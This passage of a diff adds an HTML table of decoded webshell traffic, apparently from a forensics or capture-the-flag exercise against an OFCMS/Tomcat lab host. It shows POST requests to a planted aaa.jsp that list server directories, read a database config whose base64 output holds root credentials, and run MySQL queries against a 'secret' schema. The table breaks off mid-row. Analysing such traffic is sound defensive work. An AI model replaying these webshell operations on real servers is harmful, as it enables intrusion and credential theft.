+      <td>{'msg': [{'size': '4096', 'perm': 'rwxr-xr-x', 'name': '.', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': '..', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'webapps', 'lastModified': '2024/12/08 02:39:11', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'bin', 'lastModified': '2024/12/08 02:04:04', 'type': 'directory'}, {'size': '4096', 'perm': 'rwx------', 'name': 'conf', 'lastModified': '2024/12/08 02:39:11', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'work', 'lastModified': '2024/12/08 02:39:11', 'type': 'directory'}, {'size': '6210', 'perm': 'rw-r-----', 'name': 'CONTRIBUTING.md', 'lastModified': '2024/02/14 22:52:13', 'type': 'file'}, {'size': '20913', 'perm': 'rw-r-----', 'name': 'BUILDING.txt', 'lastModified': '2024/02/14 22:52:13', 'type': 'file'}, {'size': '1726', 'perm': 'rw-r-----', 'name': 'NOTICE', 'lastModified': '2024/02/14 22:52:13', 'type': 'file'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'logs', 'lastModified': '2024/12/08 02:39:14', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'lib', 'lastModified': '2024/12/08 02:04:03', 'type': 'directory'}, {'size': '57011', 'perm': 'rw-r-----', 'name': 'LICENSE', 'lastModified': '2024/02/14 22:52:13', 'type': 'file'}, {'size': '16505', 'perm': 'rw-r-----', 'name': 'RUNNING.txt', 'lastModified': '2024/02/14 22:52:13', 'type': 'file'}, {'size': '3342', 'perm': 'rw-r-----', 'name': 'README.md', 'lastModified': '2024/02/14 22:52:13', 'type': 'file'}, {'size': '7139', 'perm': 'rw-r-----', 'name': 'RELEASE-NOTES', 'lastModified': '2024/02/14 22:52:13', 'type': 'file'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'temp', 'lastModified': '2024/12/08 02:39:17', 'type': 'directory'}], 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>10</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '文件操作', 'path': '/usr/local/tomcat/webapps/', 'mode': 'list'}</td>
+      <td>200</td>
+      <td>{'msg': [{'size': '4096', 'perm': 'rwxr-xr-x', 'name': '.', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': '..', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'ROOT', 'lastModified': '2024/12/08 02:39:11', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'ofcms-admin', 'lastModified': '2024/12/08 02:45:23', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'ofcms-api', 'lastModified': '2024/12/07 15:32:46', 'type': 'directory'}, {'size': '27016379', 'perm': 'rw-r--r--', 'name': 'ofcms-front.war', 'lastModified': '2024/12/07 15:30:59', 'type': 'file'}, {'size': '26391539', 'perm': 'rw-r--r--', 'name': 'ofcms-api.war', 'lastModified': '2024/12/07 15:30:25', 'type': 'file'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'ofcms-front', 'lastModified': '2024/12/07 15:32:45', 'type': 'directory'}, {'size': '63677307', 'perm': 'rw-r--r--', 'name': 'ofcms-admin.war', 'lastModified': '2024/12/07 15:29:52', 'type': 'file'}], 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>11</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '文件操作', 'path': '/usr/local/tomcat/webapps/ofcms-admin/', 'mode': 'list'}</td>
+      <td>200</td>
+      <td>{'msg': [{'size': '4096', 'perm': 'rwxr-xr-x', 'name': '.', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': '..', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'META-INF', 'lastModified': '2024/12/07 15:32:48', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'WEB-INF', 'lastModified': '2024/12/08 02:43:30', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'static', 'lastModified': '2024/12/08 02:45:49', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'resource', 'lastModified': '2024/12/07 15:32:47', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'upload', 'lastModified': '2024/12/07 15:32:47', 'type': 'directory'}, {'size': '612', 'perm': 'rw-r-----', 'name': 'test.jsp', 'lastModified': '2024/12/08 02:45:23', 'type': 'file'}, {'size': '4', 'perm': 'rw-r-----', 'name': 'test.txt', 'lastModified': '2024/12/08 02:44:25', 'type': 'file'}], 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>12</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '文件操作', 'path': '/usr/local/tomcat/webapps/ofcms-admin/WEB-INF/', 'mode': 'list'}</td>
+      <td>200</td>
+      <td>{'msg': [{'size': '4096', 'perm': 'rwxr-xr-x', 'name': '.', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': '..', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'jrxml', 'lastModified': '2024/12/07 15:32:47', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'page', 'lastModified': '2024/12/07 15:32:47', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'lib', 'lastModified': '2024/12/07 15:32:48', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'classes', 'lastModified': '2024/12/07 15:32:47', 'type': 'directory'}, {'size': '3630', 'perm': 'rw-r-----', 'name': 'web.xml', 'lastModified': '2024/12/07 20:37:14', 'type': 'file'}, {'size': '4', 'perm': 'rw-r-----', 'name': 'test.txt', 'lastModified': '2024/12/08 02:43:30', 'type': 'file'}], 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>13</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '文件操作', 'path': '/usr/local/tomcat/webapps/ofcms-admin/WEB-INF/classes/', 'mode': 'list'}</td>
+      <td>200</td>
+      <td>{'msg': [{'size': '4096', 'perm': 'rwxr-xr-x', 'name': '.', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': '..', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '1029', 'perm': 'rw-r-----', 'name': 'log4j.properties', 'lastModified': '2024/12/07 23:27:34', 'type': 'file'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'conf', 'lastModified': '2024/12/07 15:39:11', 'type': 'directory'}, {'size': '2279', 'perm': 'rw-r-----', 'name': 'shiro.ini', 'lastModified': '2024/12/07 23:27:34', 'type': 'file'}, {'size': '3459', 'perm': 'rw-r-----', 'name': 'ehcache.xml', 'lastModified': '2024/12/07 23:27:34', 'type': 'file'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'com', 'lastModified': '2024/12/07 15:32:47', 'type': 'directory'}], 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>14</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '文件操作', 'path': '/usr/local/tomcat/webapps/ofcms-admin/WEB-INF/classes/conf/', 'mode': 'list'}</td>
+      <td>200</td>
+      <td>{'msg': [{'size': '4096', 'perm': 'rwxr-xr-x', 'name': '.', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': '..', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '161', 'perm': 'rw-r-----', 'name': 'fdfs_client.properties', 'lastModified': '2024/12/07 23:27:34', 'type': 'file'}, {'size': '213', 'perm': 'rw-r-----', 'name': 'db.properties', 'lastModified': '2024/12/07 15:39:11', 'type': 'file'}, {'size': '4513', 'perm': 'rw-r-----', 'name': 'applicationContext.xml', 'lastModified': '2024/12/07 23:27:34', 'type': 'file'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'template', 'lastModified': '2024/12/07 15:32:47', 'type': 'directory'}, {'size': '6094', 'perm': 'rw-r-----', 'name': 'ueditor.json', 'lastModified': '2024/12/07 23:27:34', 'type': 'file'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'sql', 'lastModified': '2024/12/07 15:32:47', 'type': 'directory'}, {'size': '1216', 'perm': 'rw-r-----', 'name': 'admin.properties', 'lastModified': '2024/12/07 23:27:34', 'type': 'file'}, {'size': '1248', 'perm': 'rw-r-----', 'name': 'quartz.properties', 'lastModified': '2024/12/07 23:27:34', 'type': 'file'}, {'size': '170', 'perm': 'rw-r-----', 'name': 'db-config.properties', 'lastModified': '2024/12/07 23:27:34', 'type': 'file'}], 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>15</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '文件操作', 'path': '/usr/local/tomcat/webapps/ofcms-admin/WEB-INF/classes/conf/db.properties', 'mode': 'show'}</td>
+      <td>200</td>
+      <td>{'msg': 'I2RhdGFTb3VyY2UgY29uZmlnCiNTYXQgRGVjIDA3IDE1OjM5OjExIEdNVCAyMDI0CmpkYmMudXJsPWpkYmNcOm15c3FsXDovL2xvY2FsaG9zdFw6MzMwNi9vZmNtcz91c2VVbmljb2RlXD10cnVlJmNoYXJhY3RlckVuY29kaW5nXD1VVEYtOCZ6ZXJvRGF0ZVRpbWVCZWhhdmlvclw9Y29udmVydFRvTnVsbApqZGJjLnVzZXJuYW1lPXJvb3QKamRiYy5wYXNzd29yZD0xMjM0NTYK', 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>16</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '数据库操作', 'type': 'mysql', 'port': '3306', 'host': '127.0.0.1', 'user': 'root', 'pass': '123456', 'database': 'mysql', 'sql': 'show databases'}</td>
+      <td>200</td>
+      <td>{'msg': [[{'name': 'Database'}], ['information_schema'], ['mysql'], ['ofcms'], ['performance_schema'], ['secret'], ['sys']], 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>17</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '数据库操作', 'type': 'mysql', 'port': '3306', 'host': '127.0.0.1', 'user': 'root', 'pass': '123456', 'database': 'mysql', 'sql': 'select table_name,a.* from information_schema.tables as a where table_schema='secret' and table_type='base table''}</td>
+      <td>200</td>
+      <td>{'msg': [[{'name': 'TABLE_NAME'}, {'name': 'TABLE_CATALOG'}, {'name': 'TABLE_SCHEMA'}, {'name': 'TABLE_NAME'}, {'name': 'TABLE_TYPE'}, {'name': 'ENGINE'}, {'name': 'VERSION'}, {'name': 'ROW_FORMAT'}, {'name': 'TABLE_ROWS'}, {'name': 'AVG_ROW_LENGTH'}, {'name': 'DATA_LENGTH'}, {'name': 'MAX_DATA_LENGTH'}, {'name': 'INDEX_LENGTH'}, {'name': 'DATA_FREE'}, {'name': 'AUTO_INCREMENT'}, {'name': 'CREATE_TIME'}, {'name': 'UPDATE_TIME'}, {'name': 'CHECK_TIME'}, {'name': 'TABLE_COLLATION'}, {'name': '\x08q\x02)%\x0c'}, {'name': 'CREATE_OPTIONS'}, {'name': 'TABLE_COMMENT'}]], 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>18</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '文件操作', 'path': '/usr/', 'mode': 'list'}</td>
+      <td>200</td>
+      <td>{'msg': [{'size': '4096', 'perm': 'rwxr-xr-x', 'name': '.', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': '..', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'libexec', 'lastModified': '2024/12/07 03:06:59', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'bin', 'lastModified': '2024/12/08 02:30:22', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'include', 'lastModified': '2024/12/07 04:35:08', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'local', 'lastModified': '2024/12/08 02:04:04', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'lib32', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'lib64', 'lastModified': '2024/09/11 14:07:49', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'share', 'lastModified': '2024/12/07 09:02:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'sbin', 'lastModified': '2024/12/07 09:02:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'src', 'lastModified': '2022/04/18 10:28:59', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'lib', 'lastModified': '2024/12/07 09:02:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'games', 'lastModified': '2022/04/18 10:28:59', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'libx32', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}], 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>19</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '文件操作', 'path': '/root/', 'mode': 'list'}</td>
+      <td>200</td>
+      <td>{'msg': [{'size': '4096', 'perm': 'rwxr-xr-x', 'name': '.', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': '..', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '3267', 'perm': 'rw-r--r--', 'name': '.bashrc', 'lastModified': '2024/12/07 09:11:13', 'type': 'file'}, {'size': '161', 'perm': 'rw-r--r--', 'name': '.profile', 'lastModified': '2019/07/09 10:05:50', 'type': 'file'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': '.ssh', 'lastModified': '2024/12/08 02:30:24', 'type': 'directory'}], 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>20</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '文件操作', 'path': '/', 'mode': 'list'}</td>
+      <td>200</td>
+      <td>{'msg': [{'size': '4096', 'perm': 'rwxr-xr-x', 'name': '.', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': '..', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwx------', 'name': 'root', 'lastModified': '2024/12/08 02:30:24', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'srv', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'bin', 'lastModified': '2024/12/08 02:30:22', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'etc', 'lastModified': '2024/12/08 02:39:08', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'lib32', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'lib64', 'lastModified': '2024/09/11 14:07:49', 'type': 'directory'}, {'size': '340', 'perm': 'rwxr-xr-x', 'name': 'dev', 'lastModified': '2024/12/08 02:39:08', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxrwxrwx', 'name': 'tmp', 'lastModified': '2024/12/08 02:39:08', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'mnt', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'usr', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'home', 'lastModified': '2022/04/18 10:28:59', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'opt', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'var', 'lastModified': '2024/09/11 14:07:54', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'sbin', 'lastModified': '2024/12/07 09:02:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'lib', 'lastModified': '2024/12/07 09:02:18', 'type': 'directory'}, {'size': '0', 'perm': 'r-xr-xr-x', 'name': 'proc', 'lastModified': '2024/12/08 02:39:08', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'run', 'lastModified': '2024/12/08 02:39:10', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'media', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}, {'size': '0', 'perm': 'r-xr-xr-x', 'name': 'sys', 'lastModified': '2024/12/08 02:39:08', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'boot', 'lastModified': '2022/04/18 10:28:59', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'libx32', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'logs', 'lastModified': '2024/12/08 02:39:13', 'type': 'directory'}, {'size': '0', 'perm': 'rwxr-xr-x', 'name': '.dockerenv', 'lastModified': '2024/12/08 02:39:08', 'type': 'file'}], 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>21</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '文件操作', 'path': '/var/', 'mode': 'list'}</td>
+      <td>200</td>
+      <td>{'msg': [{'size': '4096', 'perm': 'rwxr-xr-x', 'name': '.', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': '..', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'log', 'lastModified': '2024/12/08 02:30:19', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'backups', 'lastModified': '2022/04/18 10:28:59', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'spool', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxrwxrwx', 'name': 'lock', 'lastModified': '2024/12/07 03:06:58', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxrwxr-x', 'name': 'local', 'lastModified': '2022/04/18 10:28:59', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxrwxrwx', 'name': 'tmp', 'lastModified': '2024/09/11 14:07:54', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'opt', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'cache', 'lastModified': '2024/12/07 03:07:02', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'lib', 'lastModified': '2024/12/07 07:36:33', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'run', 'lastModified': '2024/12/08 02:39:10', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxrwxr-x', 'name': 'mail', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}], 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>22</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '文件操作', 'path': '/var/', 'mode': 'list'}</td>
+      <td>200</td>
+      <td>{'msg': [{'size': '4096', 'perm': 'rwxr-xr-x', 'name': '.', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': '..', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'log', 'lastModified': '2024/12/08 02:30:19', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'backups', 'lastModified': '2022/04/18 10:28:59', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'spool', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxrwxrwx', 'name': 'lock', 'lastModified': '2024/12/07 03:06:58', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxrwxr-x', 'name': 'local', 'lastModified': '2022/04/18 10:28:59', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxrwxrwx', 'name': 'tmp', 'lastModified': '2024/09/11 14:07:54', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'opt', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'cache', 'lastModified': '2024/12/07 03:07:02', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'lib', 'lastModified': '2024/12/07 07:36:33', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'run', 'lastModified': '2024/12/08 02:39:10', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxrwxr-x', 'name': 'mail', 'lastModified': '2024/09/11 14:04:28', 'type': 'directory'}], 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>23</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '文件操作', 'path': '/var/lib/', 'mode': 'list'}</td>
+      <td>200</td>
+      <td>{'msg': [{'size': '4096', 'perm': 'rwxr-xr-x', 'name': '.', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': '..', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'dpkg', 'lastModified': '2024/12/07 09:02:19', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'systemd', 'lastModified': '2024/12/07 03:07:02', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'misc', 'lastModified': '2022/04/18 10:28:59', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'apt', 'lastModified': '2024/12/07 09:02:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'pam', 'lastModified': '2024/12/07 03:07:02', 'type': 'directory'}, {'size': '0', 'perm': 'rw-r--r--', 'name': 'shells.state', 'lastModified': '2024/09/11 14:04:54', 'type': 'file'}, {'size': '4096', 'perm': 'rwx------', 'name': 'mysql', 'lastModified': '2024/12/08 02:39:09', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'ucf', 'lastModified': '2024/12/07 09:02:19', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'redis', 'lastModified': '2024/12/07 07:36:33', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'vim', 'lastModified': '2024/12/07 04:59:11', 'type': 'directory'}, {'size': '4096', 'perm': 'rwx------', 'name': 'private', 'lastModified': '2024/12/07 03:06:58', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'python', 'lastModified': '2024/12/07 03:06:58', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'dbus', 'lastModified': '2024/12/07 03:07:01', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'polkit-1', 'lastModified': '2024/12/07 03:06:58', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'mecab', 'lastModified': '2024/12/07 03:06:25', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'mysql-upgrade', 'lastModified': '2024/10/23 12:15:00', 'type': 'directory'}, {'size': '4096', 'perm': 'rwx------', 'name': 'mysql-files', 'lastModified': '2024/12/07 03:06:36', 'type': 'directory'}, {'size': '4096', 'perm': 'rwx------', 'name': 'mysql-keyring', 'lastModified': '2024/12/07 03:06:26', 'type': 'directory'}], 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>24</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '文件操作', 'path': '/var/lib/', 'mode': 'list'}</td>
+      <td>200</td>
+      <td>{'msg': [{'size': '4096', 'perm': 'rwxr-xr-x', 'name': '.', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': '..', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'dpkg', 'lastModified': '2024/12/07 09:02:19', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'systemd', 'lastModified': '2024/12/07 03:07:02', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'misc', 'lastModified': '2022/04/18 10:28:59', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'apt', 'lastModified': '2024/12/07 09:02:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'pam', 'lastModified': '2024/12/07 03:07:02', 'type': 'directory'}, {'size': '0', 'perm': 'rw-r--r--', 'name': 'shells.state', 'lastModified': '2024/09/11 14:04:54', 'type': 'file'}, {'size': '4096', 'perm': 'rwx------', 'name': 'mysql', 'lastModified': '2024/12/08 02:39:09', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'ucf', 'lastModified': '2024/12/07 09:02:19', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': 'redis', 'lastModified': '2024/12/07 07:36:33', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'vim', 'lastModified': '2024/12/07 04:59:11', 'type': 'directory'}, {'size': '4096', 'perm': 'rwx------', 'name': 'private', 'lastModified': '2024/12/07 03:06:58', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'python', 'lastModified': '2024/12/07 03:06:58', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'dbus', 'lastModified': '2024/12/07 03:07:01', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'polkit-1', 'lastModified': '2024/12/07 03:06:58', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'mecab', 'lastModified': '2024/12/07 03:06:25', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': 'mysql-upgrade', 'lastModified': '2024/10/23 12:15:00', 'type': 'directory'}, {'size': '4096', 'perm': 'rwx------', 'name': 'mysql-files', 'lastModified': '2024/12/07 03:06:36', 'type': 'directory'}, {'size': '4096', 'perm': 'rwx------', 'name': 'mysql-keyring', 'lastModified': '2024/12/07 03:06:26', 'type': 'directory'}], 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>25</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '文件操作', 'path': '/var/lib/mysql/', 'mode': 'list'}</td>
+      <td>200</td>
+      <td>{'msg': [{'size': '4096', 'perm': 'rwxr-xr-x', 'name': '.', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': '..', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-x---', 'name': '#innodb_temp', 'lastModified': '2024/12/08 02:39:09', 'type': 'directory'}, {'size': '1705', 'perm': 'rw-------', 'name': 'server-key.pem', 'lastModified': '2024/12/07 03:06:27', 'type': 'file'}, {'size': '1705', 'perm': 'rw-------', 'name': 'ca-key.pem', 'lastModified': '2024/12/07 03:06:27', 'type': 'file'}, {'size': '8585216', 'perm': 'rw-r-----', 'name': '#ib_16384_1.dblwr', 'lastModified': '2024/12/07 03:06:26', 'type': 'file'}, {'size': '56', 'perm': 'rw-r-----', 'name': 'auto.cnf', 'lastModified': '2024/12/07 03:06:26', 'type': 'file'}, {'size': 